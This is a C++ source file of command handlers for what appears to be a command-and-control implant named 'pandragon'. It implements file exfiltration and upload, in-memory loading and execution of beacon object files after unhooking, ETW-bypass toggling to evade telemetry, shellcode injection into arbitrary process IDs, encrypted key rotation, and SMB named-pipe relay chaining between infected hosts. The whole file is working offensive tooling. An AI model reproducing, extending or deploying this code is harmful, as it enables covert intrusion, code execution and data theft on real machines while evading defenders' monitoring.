#include "../include/handlers.h"
#include "../include/managers.h"
#include "../include/utils.h"
#include "../include/etw_bypass.h"
#include "../include/network/net_abstract.h"
#include "../include/injection.h"
#include "../include/unhook.h"
#include "../include/coff/COFFSetup.h"
#include "../include/coff/beacon_compatibility.h"

#include <cstdint>

using namespace pandragon;

/* ============================================================================
 * Namespace for handler functions (used by CommandDispatcher)
 * ============================================================================ */

namespace pandragon::handlers {

/* ============================================================================
 * Constants
 * ============================================================================ */

//static constexpr uint32_t MAX_BOF_SIZE   = 0xF000;   // 60KB max BOF
static constexpr uint32_t MAX_PATH_LEN   = 512;      // Max file path (wchar_t)

/* ============================================================================
 * Helper Functions
 * ============================================================================ */

static PandragonRuntime& getRuntime() {
    return PandragonRuntime::getInstance();
}

static functionTable* getfuncTable() {
    return getRuntime().getfuncTable();
}

static inline uint16_t readLE16(const uint8_t* p) {
    return (uint16_t)p[0] | ((uint16_t)p[1] << 8);
}

static inline uint32_t readLE32(const uint8_t* p) {
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) |
           ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

/* ============================================================================
 * File Download Handlers
 * ============================================================================ */

static bool validateDownloadPath(const wchar_t* path, uint16_t path_len) {
    if (path_len >= MAX_PATH_LEN) {
        g_debugPrint("[FileDownload] Path too long: %u >= %u", path_len, MAX_PATH_LEN);
        return false;
    }
    return true;
}

bool handleFileDownloadStart(const uint8_t* args, size_t args_len) {
    auto& runtime = getRuntime();
    auto& transferMgr = runtime.getFileTransferManager();
    auto& networkMgr = runtime.getNetworkManager();

    if (args_len < 6) {
        g_debugPrint("[FileDownload] Payload too small");
        return false;
    }

    uint16_t path_len = readLE16(args);
    uint32_t chunk_size = readLE32(args + 2);

    if (args_len < 6 + path_len * sizeof(wchar_t)) {
        g_debugPrint("[FileDownload] Path length mismatch");
        return false;
    }

    const wchar_t* file_path = (const wchar_t*)(args + 6);

    if (!validateDownloadPath(file_path, path_len)) {
        (void)networkMgr.sendFileDownloadAck(0, 1);
        return false;
    }

    // Start download via manager
    BeaconError err = transferMgr.startDownload(file_path, chunk_size);
    if (err != BeaconError::SUCCESS) {
        g_debugPrint("[FileDownload] Failed to start download: %s", BeaconErrorToString(err));
        (void)networkMgr.sendFileDownloadAck(0, 1);
        return false;
    }

    FileTransferState* state = transferMgr.findActiveDownload();
    if (state) {
        g_debugPrint("[FileDownload] %ls (chunk=%lu)",
                     state->path, (unsigned long)state->chunkSize);
        g_debugPrint("[FileDownload] File size: %lu bytes, %lu chunks",
                     (unsigned long)state->fileSize, (unsigned long)state->lastChunkIndex);
    }

    (void)networkMgr.sendFileDownloadAck(state ? state->fileSize : 0, 0);
    return true;
}

bool handleFileDownloadChunk(const uint8_t* args, size_t args_len) {
    auto& runtime = getRuntime();
    auto& transferMgr = runtime.getFileTransferManager();

    if (args_len < 12) {
        g_debugPrint("[FileDownloadChunk] Payload too small");
        return false;
    }

    uint32_t chunk_index = readLE32(args);
    uint32_t offset = readLE32(args + 4);
    uint32_t chunk_size = readLE32(args + 8);

    g_debugPrint("[FileDownloadChunk] idx=%lu offset=%lu size=%lu",
                 (unsigned long)chunk_index, (unsigned long)offset, (unsigned long)chunk_size);

    BeaconError err = transferMgr.handleDownloadChunk(chunk_index, offset, chunk_size);
    if (err != BeaconError::SUCCESS) {
        g_debugPrint("[FileDownloadChunk] Handler error: %s", BeaconErrorToString(err));
        return false;
    }

    return true;
}

/* ============================================================================
 * File Upload Handlers
 * ============================================================================ */

static bool validateUploadPath(const wchar_t* path, uint16_t path_len) {
    if (path_len >= MAX_PATH_LEN) {
        g_debugPrint("[FileUpload] Path too long: %u >= %u", path_len, MAX_PATH_LEN);
        return false;
    }
    return true;
}

bool handleFileUploadStart(const uint8_t* args, size_t args_len) {
    auto& runtime = getRuntime();
    auto& transferMgr = runtime.getFileTransferManager();

    if (args_len < 10) {
        g_debugPrint("[FileUpload] Payload too small");
        return false;
    }

    uint16_t path_len = readLE16(args);
    uint32_t file_size = readLE32(args + 2);
    uint32_t chunk_size = readLE32(args + 6);

    if (args_len < 10 + path_len * sizeof(wchar_t)) {
        g_debugPrint("[FileUpload] Path length mismatch");
        return false;
    }

    const wchar_t* file_path = (const wchar_t*)(args + 10);

    if (!validateUploadPath(file_path, path_len)) {
        return false;
    }

    BeaconError err = transferMgr.startUpload(file_path, file_size, chunk_size);
    if (err != BeaconError::SUCCESS) {
        g_debugPrint("[FileUpload] Failed to start upload: %s", BeaconErrorToString(err));
        return false;
    }

    FileTransferState* state = transferMgr.findActiveUpload();
    if (state) {
        g_debugPrint("[FileUpload] %ls (size=%lu, chunk=%lu)",
                     state->path, (unsigned long)file_size,
                     (unsigned long)state->chunkSize);
        g_debugPrint("[FileUpload] Ready to receive %lu bytes", (unsigned long)file_size);
    }

    return true;
}

bool handleFileUploadChunk(const uint8_t* args, size_t args_len) {
    auto& runtime = getRuntime();
    auto& transferMgr = runtime.getFileTransferManager();

    if (args_len < 13) {
        g_debugPrint("[FileUploadChunk] Payload too small");
        return false;
    }

    uint32_t chunk_index = readLE32(args);
    uint32_t offset = readLE32(args + 4);
    uint32_t chunk_size = readLE32(args + 8);
    uint8_t is_last = args[12];

    if (args_len < 13 + chunk_size) {
        g_debugPrint("[FileUploadChunk] Data length mismatch");
        return false;
    }

    const uint8_t* chunk_data = args + 13;

    g_debugPrint("[FileUploadChunk] idx=%lu offset=%lu size=%lu is_last=%u",
                 (unsigned long)chunk_index, (unsigned long)offset,
                 (unsigned long)chunk_size, is_last);

    BeaconError err = transferMgr.handleUploadChunk(
        chunk_index, offset, chunk_data, chunk_size, is_last != 0);

    if (err != BeaconError::SUCCESS) {
        g_debugPrint("[FileUploadChunk] Handler error: %s", BeaconErrorToString(err));
        return false;
    }

    return true;
}

/* ============================================================================
 * Command Handlers (per-opcode)
 * ============================================================================ */

bool handleEcho(const uint8_t* args, size_t args_len) {
    g_debugPrint("[ECHO] %.*s", (int)args_len, (const char*)args);
    
    // Send the echoed data back to the server
    if (args_len > 0) {
        // Null-terminate for proper string transmission
        char* echo_buf = (char*)__malloc(args_len + 1);
        if (echo_buf) {
            __memcpy(echo_buf, args, args_len);
            echo_buf[args_len] = '\0';
            
            (void)::sendData(static_cast<const void*>(echo_buf), args_len);
            __free(echo_buf);
        }
    }
    
    return false;
}

bool handleSleep(const uint8_t* args, size_t args_len) {
    auto& runtime = getRuntime();
    
    if (args_len < sizeof(uint32_t) + sizeof(uint8_t)) {
        return false;
    }
    
    uint32_t sleep_ms = readLE32(args);
    uint8_t jitter_pct = args[sizeof(uint32_t)];
    
    g_debugPrint("[SLEEP] %lu ms, %u%% jitter", (unsigned long)sleep_ms, (unsigned)jitter_pct);
    
    // Update runtime sleep config
    runtime.setSleepDuration(sleep_ms);
    runtime.setJitterPercent(jitter_pct);
    
    ExecuteSleep(runtime.getfuncTable(), sleep_ms, jitter_pct);
    return false;
}


bool handleBofExec(const uint8_t* args, size_t args_len) {
    constexpr size_t HEADER_SIZE = 10; // [bof_id(4), bof_len(2), arg_len(4)]

    if (args_len < HEADER_SIZE) {
        g_debugPrint("[BOF_EXEC] Need at least %zu bytes for header", HEADER_SIZE);
        return false;
    }

    uint32_t bof_id = readLE32(args);
    uint16_t bof_len = readLE16(args + 4);
    uint32_t arg_len = readLE32(args + 6);

    g_debugPrint("[BOF_EXEC] bof_id=%u bof_len=%u arg_len=%u", bof_id, bof_len, arg_len);

    if (args_len < HEADER_SIZE + bof_len + arg_len) {
        g_debugPrint("[BOF_EXEC] Payload too short: %zu < %zu", args_len, HEADER_SIZE + bof_len + arg_len);
        return false;
    }

    const uint8_t* bof_data = args + HEADER_SIZE;
    const uint8_t* arg_data = args + HEADER_SIZE + bof_len;

    auto& runtime = getRuntime();
    runtime.ensureUnhooked();

    bof_cache_entry* cached = BofCacheManager::instance().find(bof_id);

    if (cached && bof_len == 0) {
        g_debugPrint("[BOF_EXEC] Cache hit for bof_id=%u", bof_id);

        if (!cached->ctx || !cached->ctx->entryPoint) {
            g_debugPrint("[BOF_EXEC] Cached BOF has null entryPoint");
            return false;
        }

        void (*bof_entry)(char*, unsigned long) =
            (void (*)(char*, unsigned long))cached->ctx->entryPoint;
        bof_entry((char*)arg_data, (unsigned long)arg_len);

        int outLen = 0;
        char* output = BeaconGetOutputData(&outLen);
        if (output && outLen > 0) {
            (void)pandragon::sendBofOutput(output, outLen, 0);
            __free(output);
        }
    } else if (bof_len > 0) {
        g_debugPrint("[BOF_EXEC] Cache miss, loading BOF id=%u len=%u", bof_id, bof_len);

        COFF_LOADED* ctx = (COFF_LOADED*)__malloc(sizeof(COFF_LOADED));
        if (!ctx) {
            g_debugPrint("[BOF_EXEC] Failed to allocate ctx");
            return false;
        }
        __memset(ctx, 0, sizeof(COFF_LOADED));

        int ret = SetupCOFF(getfuncTable(), const_cast<char*>("go"),
                            const_cast<uint8_t*>(bof_data), bof_len, ctx);
        if (ret != 0) {
            g_debugPrint("[BOF_EXEC] SetupCOFF failed (ret=%d)", ret);
            CleanupCOFF(ctx);
            __free(ctx);
            return false;
        }

        if (!ctx->entryPoint) {
            g_debugPrint("[BOF_EXEC] go() entryPoint is NULL");
            CleanupCOFF(ctx);
            __free(ctx);
            return false;
        }

        BofCacheManager::instance().insert(bof_id, ctx);

        void (*bof_entry)(char*, unsigned long) =
            (void (*)(char*, unsigned long))ctx->entryPoint;
        bof_entry((char*)arg_data, (unsigned long)arg_len);

        int outLen = 0;
        char* output = BeaconGetOutputData(&outLen);
        if (output && outLen > 0) {
            (void)pandragon::sendBofOutput(output, outLen, 0);
            __free(output);
        }
    }

    return false;
}

bool handleBofFree(const uint8_t* args, size_t args_len) {
    if (args_len < 4) return false;

    uint32_t bof_id = readLE32(args);

    bof_cache_entry* entry = BofCacheManager::instance().find(bof_id);
    if (entry) {
        if (entry->ctx) {
            CleanupCOFF(entry->ctx);
            __free(entry->ctx);
        }
        BofCacheManager::instance().remove(bof_id);
        g_debugPrint("[BOF_FREE] Freed bof_id=%u", bof_id);
        return true;
    }

    g_debugPrint("[BOF_FREE] Not found bof_id=%u", bof_id);
    return false;
}

/* LONG_RUNNING_BOF handler: send signals to running async BOFs
 * Payload: uint32_t task_id + uint8_t subcmd + [optional args]
 * Subcommands: 0=start (ignored), 1=abort, 2=update_args, 3=remove
 */
bool handleLongRunningBof(const uint8_t* args, size_t args_len) {
    if (args_len < 5) {
        g_debugPrint("[LONG_RUNNING_BOF] Need at least 5 bytes (task_id + subcmd)");
        return false;
    }

    uint32_t task_id = readLE32(args);
    uint8_t subcmd = args[4];
    const uint8_t* cmd_args = args + 5;
    size_t cmd_args_len = args_len - 5;

    async_bof_state* state = AsyncBofManager::instance().find(task_id);
    if (!state) {
        g_debugPrint("[LONG_RUNNING_BOF] task_id=%u not found", task_id);
        return false;
    }

    if (!state->channel) {
        g_debugPrint("[LONG_RUNNING_BOF] task_id=%u has no channel", task_id);
        return false;
    }

    bof_channel* ch = state->channel;

    if (ch->signal_ack == 0 && ch->signal != 0) {
        g_debugPrint("[LONG_RUNNING_BOF] task_id=%u has pending unacknowledged signal", task_id);
        return false;
    }

    switch (subcmd) {
        case 0:
            g_debugPrint("[LONG_RUNNING_BOF] task_id=%u already running", task_id);
            break;
        case 1: // ABORT
            g_debugPrint("[LONG_RUNNING_BOF] Sending ABORT to task_id=%u", task_id);
            ch->signal = CHANNEL_SIGNAL_ABORT;
            ch->signal_ack = 0;
            break;
        case 2: // ARGS_UPDATE
            g_debugPrint("[LONG_RUNNING_BOF] Sending ARGS_UPDATE to task_id=%u (len=%zu)", task_id, cmd_args_len);
            if (cmd_args_len > BOF_CHANNEL_DATA_SIZE) {
                g_debugPrint("[LONG_RUNNING_BOF] Args too large: %zu > %d", cmd_args_len, BOF_CHANNEL_DATA_SIZE);
                return false;
            }
            ch->signal = CHANNEL_SIGNAL_ARGS_UPDATE;
            ch->signal_ack = 0;
            if (cmd_args_len > 0) {
                __memcpy(ch->data, cmd_args, cmd_args_len);
            }
            break;
        case 3: // Remove (force reap)
            g_debugPrint("[LONG_RUNNING_BOF] Removing task_id=%u", task_id);
            AsyncBofManager::instance().remove(state);
            return true;
        default:
            g_debugPrint("[LONG_RUNNING_BOF] Unknown subcmd=%u for task_id=%u", subcmd, task_id);
            break;
    }

    return true;
}

bool handleRotateKey(const uint8_t* args, size_t args_len) {
    auto& runtime = getRuntime();
    auto& networkMgr = runtime.getNetworkManager();

    if (args_len < sizeof(pandragon::payload_rotate_key)) {
        g_debugPrint("[ROTATE_KEY] Payload too small: %zu < %zu",
                     args_len, sizeof(pandragon::payload_rotate_key));
        return false;
    }

    const pandragon::payload_rotate_key* rotate_req =
        reinterpret_cast<const pandragon::payload_rotate_key*>(args);

    const uint8_t* my_beacon_id = runtime.getBeaconId();
    if (__memcmp(rotate_req->beacon_id, my_beacon_id, 8) != 0) {
        g_debugPrint("[ROTATE_KEY] Beacon ID mismatch - rejecting");
        (void)networkMgr.sendKeyRotateAck(1);
        return false;
    }

    g_debugPrint("[ROTATE_KEY] Beacon ID verified - rotating key");
    (void)networkMgr.sendKeyRotateAck(0);
    
    // Update runtime config and underlying network layer
    __memcpy(runtime.getConfig().crypto_key, rotate_req->new_crypto_key, 32);
    setBeaconIdentity(nullptr, rotate_req->new_crypto_key);
    
    // Clear key rotation pending flag and reset sequence number
    clearKeyRotationPending();
    
    g_debugPrint("[ROTATE_KEY] Key rotation complete, sequence number reset");
    return false;
}

bool handleEtwEnable(const uint8_t* args, size_t args_len) {
    (void)args;
    (void)args_len;
    
    g_debugPrint("[ETW_ENABLE] Received");
    if (ETW_Enable(getfuncTable())) {
        g_debugPrint("[ETW] ETW bypass enabled successfully");
    } else {
        g_debugPrint("[ETW] Failed to enable ETW bypass");
    }
    return false;
}

bool handleEtwDisable(const uint8_t* args, size_t args_len) {
    (void)args;
    (void)args_len;

    g_debugPrint("[ETW_DISABLE] Received");
    if (ETW_Disable()) {
        g_debugPrint("[ETW] ETW bypass disabled successfully");
    } else {
        g_debugPrint("[ETW] Failed to disable ETW bypass");
    }
    return false;
}

bool handleExit(const uint8_t* args, size_t args_len) {
    (void)args;
    (void)args_len;

    g_debugPrint("[EXIT] Received DIE opcode from server. Terminating process.");

    // Direct NtTerminateProcess on self. No cleanup required. Kernel handles everything.
    getfuncTable()->NtTerminateProcess((HANDLE)-1, 0);

    __builtin_unreachable();
}

/* ============================================================================
 * Process Injection Handlers
 * ============================================================================ */

static constexpr uint32_t MAX_SHELLCODE_SIZE = 0x100000;  // 1MB max shellcode
// could be a BOF. TODO
bool handleInjectProcess(const uint8_t* args, size_t args_len) {
    /*
     * Payload format:
     *   pid (4 bytes, uint32_t)
     *   shellcode_len (4 bytes, uint32_t)
     *   shellcode (shellcode_len bytes)
     */
    if (args_len < 8) {
        g_debugPrint("[INJECT] Payload too small");
        return false;
    }

    uint32_t pid = readLE32(args);
    uint32_t shellcode_len = readLE32(args + 4);

    if (shellcode_len == 0 || shellcode_len > MAX_SHELLCODE_SIZE) {
        g_debugPrint("[INJECT] Invalid shellcode size: %u", (unsigned)shellcode_len);
        return false;
    }

    if (args_len < 8 + shellcode_len) {
        g_debugPrint("[INJECT] Payload too small: have %zu, need %u", args_len, (unsigned)(8 + shellcode_len));
        return false;
    }

    const uint8_t* shellcode = args + 8;

    g_debugPrint("[INJECT] Injecting into PID %u (%u bytes)", (unsigned)pid, (unsigned)shellcode_len);

    functionTable* nt = getfuncTable();
    if (!nt) {
        g_debugPrint("[INJECT] functionTable not available");
        return false;
    }

    BOOL ok = InjectIntoProcess(nt, pid, shellcode, shellcode_len);

    if (ok) {
        g_debugPrint("[INJECT] Injection into PID %u successful", (unsigned)pid);
    } else {
        g_debugPrint("[INJECT] Injection into PID %u failed", (unsigned)pid);
    }

    return false;  // Don't break main loop
}

/* ============================================================================
 * P2P Relay (SMB Beacon Chaining)
 * ============================================================================ */

bool handleStartRelay(const uint8_t* args, size_t args_len) {
    (void)args; (void)args_len;
    g_debugPrint("[RELAY] Enabling relay mode");
    relayEnable();
    return false;  // don't exit
}

bool handleStopRelay(const uint8_t* args, size_t args_len) {
    (void)args; (void)args_len;
    g_debugPrint("[RELAY] Disabling relay mode, draining children");
    relayDisable();
    return false;
}

bool handleRelayAddChild(const uint8_t* args, size_t args_len) {
    // [pipe_id (4B LE)] [pipe_name_len (1B)] [pipe_name (variable, UTF-16)]
    if (args_len < 5) {
        g_debugPrint("[RELAY] ADD_CHILD: payload too small");
        return false;
    }

    uint32_t pipe_id = readLE32(args);
    uint8_t nameLenBytes = args[4];
    // nameLenBytes is the number of bytes in the pipe name string
    if (args_len < 5 + nameLenBytes) {
        g_debugPrint("[RELAY] ADD_CHILD: name length mismatch");
        return false;
    }

    // Convert UTF-16 to wide string
    const uint8_t* nameData = args + 5;
    size_t wcharLen = nameLenBytes / sizeof(wchar_t);
    if (wcharLen >= MAX_PIPE_NAME_LEN) {
        g_debugPrint("[RELAY] ADD_CHILD: pipe name too long");
        return false;
    }

    wchar_t pipeName[MAX_PIPE_NAME_LEN];
    for (size_t i = 0; i < wcharLen; i++) {
        pipeName[i] = (wchar_t)(nameData[i * 2] | (nameData[i * 2 + 1] << 8));
    }
    pipeName[wcharLen] = L'\0';

    g_debugPrint("[RELAY] ADD_CHILD: pipe_id=%u, pipe_name=%ls", (unsigned)pipe_id, pipeName);
    if (!relayAddChild(pipeName, wcharLen, pipe_id)) {
        g_debugPrint("[RELAY] ADD_CHILD: failed to add child");
    }
    return false;
}

bool handleRelayRemoveChild(const uint8_t* args, size_t args_len) {
    if (args_len < 4) {
        g_debugPrint("[RELAY] REMOVE_CHILD: payload too small");
        return false;
    }

    uint32_t pipe_id = readLE32(args);
    g_debugPrint("[RELAY] REMOVE_CHILD: pipe_id=%u", (unsigned)pipe_id);
    if (!relayRemoveChild(pipe_id)) {
        g_debugPrint("[RELAY] REMOVE_CHILD: not found");
    }
    return false;
}

bool handleRelayDown(const uint8_t* args, size_t args_len) {
    // [pipe_id (4B LE)] [encrypted packet...]
    return relayHandleRelayDown(args, args_len);
}

} // namespace pandragon::handlers
